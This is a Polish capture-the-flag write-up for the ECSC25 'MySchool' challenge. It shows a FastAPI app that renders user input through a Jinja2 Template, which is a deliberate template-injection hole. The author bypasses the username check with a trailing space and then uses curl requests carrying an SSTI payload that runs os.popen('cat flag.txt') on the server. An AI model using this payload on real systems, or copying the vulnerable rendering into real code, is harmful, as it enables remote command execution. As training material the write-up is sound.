# MySchool

Zadanie podaje nam kod źródłowy serwera `app.py`:
```python
import uuid

import uvicorn
from dataclasses import dataclass
from typing import Optional
from fastapi import Response, Request, FastAPI, HTTPException
from jinja2 import Template
import mysql.connector


cnx_pool = mysql.connector.pooling.MySQLConnectionPool(
    host="mysql",
    port=3306,
    user="user",
    password="user",
    database="db",
    pool_size=32,
    pool_name="pool",
    use_pure=True,
)


@dataclass
class User:
    username: Optional[str] = uuid.uuid4()
    bio: Optional[str] = "default bio"


app = FastAPI()


@app.middleware("http")
async def get_db_connection(request: Request, call_next):
    response = Response("Internal server error", status_code=500)
    request.state.db = cnx_pool.get_connection()
    try:
        response = await call_next(request)
    finally:
        request.state.db.close()
    return response


@app.post("/users/")
def create_user(request: Request, user: User):
    if user.username != "test":
        cursor = request.state.db.cursor()
        session_id = uuid.uuid4()
        cursor.execute(
            "insert into users (username, bio,session_id) values (%s,%s,%s)",
            [user.username, user.bio, str(session_id)],
        )
        request.state.db.commit()
        return session_id
    else:
        raise HTTPException(status_code=403, detail="Can't modify the test user!")


@app.get("/users/")
def get_users(request: Request, session_id: Optional[str] = None):
    cursor = request.state.db.cursor()
    query = "select username, bio, (username='test') as matched from users where (session_id is NULL or session_id=%s)"
    cursor.execute(query, [session_id])
    found = [
        f"Welcome {username}, {bio}!"
        for (username, bio, matched) in cursor
        if matched != False
    ]
    return Template("\n".join(found)).render()


@app.get("/")
def index():
    return "You can't connect to this API with your browser. Check the source code."


if __name__ == "__main__":
    uvicorn.run(app)
```
oraz `schema.sql`
```sql
DROP TABLE IF EXISTS `users`;

CREATE TABLE `users` (
  `id` int(9) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(100),
  `bio` varchar(255),
  `session_id` varchar(100),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=ASCII;

INSERT INTO `users` (`id`, `username`, `bio`) VALUES (1, 'test', 'test bio');
```
Oraz adres: `https://myschool.ecsc25.hack.cert.pl/`

# Testowanie
Z kodu źródłowego wyczytujemy że endpoint `/` do niczego nie służy, a `/users/` przyjmuje requesty `POST` i `GET`, więc wyślijmy po jednym:
### Request `GET`
```bash
stigs@stigsec:~$ curl -X GET https://myschool.ecsc25.hack.cert.pl/users/
"Welcome test, test bio!"
```
### Request `POST`
```bash
stigs@stigsec:~$ curl -X POST https://myschool.ecsc25.hack.cert.pl/users/ -H "Content-Type: application/json" -d '{"username":"x","bio":"x"}'
"f49f2734-a2db-4ae3-8d5d-8a4c9a21b6ae"
```
Po wysłaniu `POST` do /users/ z wypełnionym `username` i `bio` otrzymaliśmy `session_id` który możemy użyć aby otrzymać informacje z bazy danych:
```bash
stigs@stigsec:~$ curl -X GET https://myschool.ecsc25.hack.cert.pl/users/?session_id=f49f2734-a2db-4ae3-8d5d-8a4c9a21b6ae
"Welcome test, test bio!"
```
Jak widać `username` i `bio` to dalej 'test' a nie 'x' jak wpisałem. Dzieje się tak dlatego że backend wyświetla tylko uzytkownika o nazwie `test`, pomijając wszystko inne. Zawdzięczamy to warunkowi w kodzie który filtruje wyniki i pokazuje tylko rekordy gdzie `username='test'`. Nasz nowo dodany rekord trafia do bazy danych, ale nie jest widoczny w odpowiedzi na nasz request `GET` mimo podania prawidłowego `session_id`
## SSTI (Server-Side Template Injection)
Backend renderuje `bio` użytkownika `test` za pomocą `return Template("\n".join(found)).render()`, więc jeśli zmienimy `bio` użytkownika `test` to może dojść to SSTI.
# Exploitacja
Z kodu widać że nie można edytować `bio` uzytkownika `test`, ale warunek sprawdzający nazwę porównuje ją **bez przycinania spacji**. Dzięki temu kiedy stworzymy użytkownika `test `(spacja na końcu) to ominiemy zabezpieczenie, a `bio` z payloadem `{{7*7}}` zostanie wyrenderowane.
```bash
stigs@stigsec:~$ curl -X POST https://myschool.ecsc25.hack.cert.pl/users/ -H "Content-Type: application/json" -d '{"username":"test ","bio":"{{7*7}}"}'
"4cc2c6f4-2ae3-40f1-81fc-ef6a8998172c"
```
Następnie robimy request `GET` z podanym `session_id`
```bash
stigs@stigsec:~$ curl -X GET https://myschool.ecsc25.hack.cert.pl/users/?session_id=4cc2c6f4-2ae3-40f1-81fc-ef6a8998172c
"Welcome test, test bio!\nWelcome test , 49!"
```
Jak widać payloadm został wyrenderowany, więc zdobycie flagi to kwestia doboru payloadu który odczyta flagę z `flag.txt`:
```bash
stigs@stigsec:~$ curl -X POST https://myschool.ecsc25.hack.cert.pl/users/ \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"test \", \"bio\": \"{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}\"}"
"4e2d184e-5159-45cb-bb6d-b5c6682d71dc"
```
Teraz request `GET` z tym `session_id` i mamy flagę!
```bash
stigs@stigsec:~$ curl -X GET https://myschool.ecsc25.hack.cert.pl/users/?session_id=4e2d184e-5159-45cb-bb6d-b5c6682d71dc
"Welcome test, test bio!\nWelcome test , ecsc25{NULL_is_not_always_False}!"s
```
